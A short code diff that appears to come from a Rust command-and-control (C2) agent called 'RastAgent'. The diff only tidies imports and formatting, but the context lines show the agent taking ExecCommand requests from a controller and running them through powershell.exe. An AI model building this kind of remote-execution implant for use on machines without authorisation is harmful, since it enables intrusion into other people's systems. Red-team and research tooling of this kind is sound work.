@@ -7,7 +7,7 @@ use std::{
 
 use anyhow::{anyhow, Result};
 use bytes::Bytes;
-use commands::{Commands};
+use commands::Commands;
 use futures_util::{sink::SinkExt, stream::StreamExt};
 use rast::{
     messages::c2_agent::{AgentMessage, AgentResponse, C2Request},
@@ -16,7 +16,7 @@ use rast::{
 };
 use tokio::{process::Command as SystemCommand, sync::Mutex};
 use tokio_util::codec::BytesCodec;
-use tracing::{info};
+use tracing::info;
 
 use crate::context::Context;
 
@@ -56,9 +56,7 @@ impl RastAgent {
             if let Some(msg) = frame.next().await {
                 let msg: AgentMessage = serde_json::from_slice(&msg.unwrap()).unwrap();
                 info!("Request {:?}", msg);
-                let AgentMessage::C2Request(C2Request::ExecCommand(cmd)) = msg else {
-                    todo!()
-                };
+                let AgentMessage::C2Request(C2Request::ExecCommand(cmd)) = msg else {todo!()};
 
                 let output = if cfg!(target_os = "windows") {
                     SystemCommand::new("powershell.exe")
